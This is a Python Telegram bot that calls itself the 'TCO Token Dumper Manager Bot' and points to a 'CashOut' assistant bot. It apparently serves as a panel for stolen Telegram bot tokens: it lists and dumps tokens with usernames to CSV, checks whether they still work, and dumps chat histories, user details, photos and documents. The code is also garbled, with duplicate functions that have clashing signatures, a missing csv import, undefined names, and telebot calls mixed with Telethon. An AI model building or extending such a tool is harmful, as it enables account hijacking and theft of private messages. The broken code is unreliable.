import telebot
import sqlite3
import os
import json
import datetime

    
def launch_bot(TOKEN, user_id):
    try:
        bot = telebot.TeleBot(TOKEN)

        # Create the inline menu
        inline_menu = telebot.types.InlineKeyboardMarkup()
        button1 = telebot.types.InlineKeyboardButton(text='📃 List Tokens', callback_data='list_tokens')
        button2 = telebot.types.InlineKeyboardButton(text='🚚 Dump Tokens', callback_data='dump_tokens')
        button3 = telebot.types.InlineKeyboardButton(text='✅ Bot Auth Check', callback_data='bot_auth')
        button4 = telebot.types.InlineKeyboardButton(text='🕔 Chat History', callback_data='get_chat_history')
        button5 = telebot.types.InlineKeyboardButton(text='💬 Text History', callback_data='save_text_history')
        button6 = telebot.types.InlineKeyboardButton(text='🔏 Save Users Info', callback_data='save_user_info')
        button7 = telebot.types.InlineKeyboardButton(text='📸 Save Photos', callback_data='save_media_photo')
        button8 = telebot.types.InlineKeyboardButton(text='📝 Save Chat History Text', callback_data='save_chats_text_history')
        button9 = telebot.types.InlineKeyboardButton(text='📸 Save Multi-Media', callback_data='save_media_document')
        button10 = telebot.types.InlineKeyboardButton(text='📂 Get Documents', callback_data='get_document_filename')
        button11 = telebot.types.InlineKeyboardButton(text='🗑 Remove Old Text History', callback_data='remove_old_text_history')

        inline_menu.row(button1, button2)
        inline_menu.row(button3, button4)
        inline_menu.row(button5, button6)
        inline_menu.row(button7, button8)
        inline_menu.row(button9, button10)
        inline_menu.row(button11)

        # Send a message to user and groups indicating the bot is online
        bot.send_message(
            user_id,
            "Welcome to the TCO Token Dumper Manager Bot!\n\n"
            "Here, you can easily manage, access, and view your saved tokens from the Dumper Panel.\n\n"
            "If you have any issues, questions, comments, or concerns, please check out the @CashOut_Assistant_Bot.",
            reply_markup=inline_menu
        )
        return "Bot launched successfully."

    except telebot.apihelper.ApiException as e:
        return f"Failed to launch the bot. Error: {str(e)}"


def print_bot_info(bot_info):
    print(f"ID: {bot_info.id}")
    print(f"Name: {bot_info.first_name}")
    print(f"Username: @{bot_info.username} - https://t.me/{bot_info.username}")


def print_user_info(user_info):
    print("="*20 + f"\nNEW USER DETECTED: {user_info.id}")
    print(f"First name: {user_info.first_name}")
    print(f"Last name: {user_info.last_name}")
    if user_info.username:
        print(f"Username: @{user_info.username} - https://t.me/{user_info.username}")
    else:
        print("User has no username")


def save_user_info(user):
    user_id = str(user.id)
    user_dir = os.path.join(base_path, user_id)
    if not os.path.exists(user_dir):
        os.mkdir(user_dir)
    user_media_dir = os.path.join(base_path, user_id, 'media')
    if not os.path.exists(user_media_dir):
        os.mkdir(user_media_dir)
    json.dump(user.to_dict(), open(os.path.join(user_dir, f'{user_id}.json'), 'w'))


async def safe_api_request(coroutine, comment):
    result = None
    try:
        result = await coroutine
    except RpcCallFailError as e:
        print(f"Telegram API error, {comment}: {str(e)}")
    except Exception as e:
        print(f"Some error, {comment}: {str(e)}")
    return result


async def save_media_photo(bot, chat_id, photo):
    user_media_dir = os.path.join(base_path, chat_id, 'media')
    await safe_api_request(bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg')), 'download media photo')


def get_document_filename(document):
    for attr in document.attributes:
        if isinstance(attr, DocumentAttributeFilename):
            return attr.file_name
        # voice & round video
        if isinstance(attr, DocumentAttributeAudio) or isinstance(attr, DocumentAttributeVideo):
            return f'{document.id}.{document.mime_type.split("/")[1]}'


async def save_media_document(bot, chat_id, document):
    user_media_dir = os.path.join(base_path, chat_id, 'media')
    filename = os.path.join(user_media_dir, get_document_filename(document))
    if os.path.exists(filename):
        old_filename, extension = os.path.splitext(filename)
        filename = f'{old_filename}_{document.id}{extension}'
    await safe_api_request(bot.download_file(document, filename), 'download file')
    return filename




def list_tokens():
    """Retrieve tokens from the database and format them into a message."""
    try:
        conn = sqlite3.connect('database.db')  # Connect to the SQLite database
        cursor = conn.cursor()  # Create a cursor object to interact with the database
        cursor.execute("SELECT Token, Username FROM Tokens")  # Execute SQL query to fetch tokens
        results = cursor.fetchall()  # Fetch all results from the executed query
        conn.close()  # Close the database connection

        message = "Tokens in the database:\n"  # Initialize the message
        for token, username in results:  # Iterate over the results
            message += f"Token: {token}, Username: {username}\n"  # Append each token and username to the message
        
        return message  # Return the formatted message

    except sqlite3.Error as e:
        return f"Database error: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"






def dump_tokens():
    try:
        # Connect to the database
        with sqlite3.connect('database.db') as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT Token, Username FROM Tokens")
            results = cursor.fetchall()

        # Check if there are tokens to dump
        if not results:
            return "No tokens available to dump."

        # Define the CSV file path
        csv_file_path = 'tokens_dump.csv'

        # Write the tokens to a CSV file
        with open(csv_file_path, mode='w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(['Token', 'Username'])  # Write header
            writer.writerows(results)  # Write token data

        return f"Tokens successfully dumped to {csv_file_path}."

    except sqlite3.Error as e:
        return f"An error occurred while accessing the database: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"

def bot_auth(token):
    """Check the bot's authorization status and webhook configuration."""
    try:
        bot = telebot.TeleBot(token)

        # Check bot authorization by getting bot info
        bot_info = bot.get_me()  # This will raise an exception if the token is invalid
        bot_username = bot_info.username
        bot_id = bot_info.id

        # Check webhook status
        webhook_info = bot.get_webhook_info()
        webhook_url = webhook_info.url
        webhook_active = webhook_info.has_custom_certificate

        # Prepare the report message
        message = (
            f"Bot is authorized.\n"
            f"Bot ID: {bot_id}\n"
            f"Bot Username: @{bot_username}\n"
            f"Webhook URL: {webhook_url if webhook_url else 'No webhook set'}\n"
            f"Webhook Active: {'Yes' if webhook_active else 'No'}"
        )

        return message

    except telebot.apihelper.ApiException as e:
        return f"Bot authentication failed: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"




def save_text_history(message):
    """Save the text history of a message to a file named after the user ID."""
    try:
        # Extract relevant information from the message
        user_id = message.from_user.id
        text = message.text
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Define the file path
        file_path = f"{user_id}.txt"

        # Create or append to the user's text file
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"{timestamp}: {text}\n")  # Write the timestamp and message

        return "Text history saved successfully."

    except Exception as e:
        return f"An unexpected error occurred while saving text history: {str(e)}"

def save_user_info(message):
    """Save the user information for a message."""
    try:
        # Extract relevant information from the message
        user_id = message.from_user.id
        username = message.from_user.username
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name

        # Connect to the database
        with sqlite3.connect('database.db') as conn:
            cursor = conn.cursor()

            # Create the table if it doesn't exist
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS Users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT
                )
            """)

            # Insert or update the user information
            cursor.execute("""
                INSERT INTO Users (user_id, username, first_name, last_name)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(user_id) DO UPDATE SET username = ?, first_name = ?, last_name = ?
            """, (user_id, username, first_name, last_name, username, first_name, last_name))

            conn.commit()  # Commit the changes

        return "User information saved successfully."

    except sqlite3.Error as e:
        return f"An error occurred while saving user information: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"

def save_media_photo(message):
    """Save photos sent to the bot."""
    try:
        # Check if the message contains a photo
        if message.content_type == 'photo':
            # Get the largest photo available (the last one in the list)
            photo = message.photo[-1]
            file_id = photo.file_id

            # Download the photo
            file_info = bot.get_file(file_id)
            file_path = file_info.file_path

            # Define the local file name and path
            local_file_path = os.path.join(PHOTO_DIR, f"{message.from_user.id}_{file_id}.jpg")

            # Download the file
            downloaded_file = bot.download_file(file_path)

            # Save the file locally
            with open(local_file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            return f"Photo saved successfully as {local_file_path}."

        else:
            return "No photo found in the message."

    except telebot.apihelper.ApiException as e:
        return f"Failed to save photo: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred while saving the photo: {str(e)}"

async def get_chat_history(bot, from_id=0, to_id=0, chat_id=None, lookahead=0):
    print(f'Dumping history from {from_id} to {to_id}...')
    messages = await bot(GetMessagesRequest(range(to_id, from_id)))
    empty_message_counter = 0
    history_tail = True
    for m in messages.messages:
        is_empty = await process_message(bot, m, empty_message_counter)
        if is_empty:
            empty_message_counter += 1

    if empty_message_counter:
        print(f'Empty messages x{empty_message_counter}')
        history_tail = True

    save_chats_text_history()
    if not history_tail:
        return await get_chat_history(bot, from_id+HISTORY_DUMP_STEP, to_id+HISTORY_DUMP_STEP, chat_id, lookahead)
    else:
        if lookahead:
            return await get_chat_history(bot, from_id+HISTORY_DUMP_STEP, to_id+HISTORY_DUMP_STEP, chat_id, lookahead-1)
        else:
            print('History was fully dumped.')
            return None

def save_media_document():
    # Implement the logic to save media documents
    pass

def get_document_filename(message):
    """Get the file name of a document and forward it to the user's chat."""
    try:
        # Check if the message contains a document
        if message.content_type == 'document':
            # Get the document file ID
            file_id = message.document.file_id

            # Get the document file name
            file_name = message.document.file_name

            # Forward the document to the user's chat
            bot.forward_message(chat_id=message.chat.id, from_chat_id=message.chat.id, message_id=message.message_id)

            return f"Document '{file_name}' forwarded to your chat."

        else:
            return "No document found in the message."

    except telebot.apihelper.ApiException as e:
        return f"Failed to forward the document: {str(e)}"
    except Exception as e:
        return f"An unexpected error occurred while forwarding the document: {str(e)}"

def remove_old_text_history():
    # Implement the logic to remove old text history
    pass

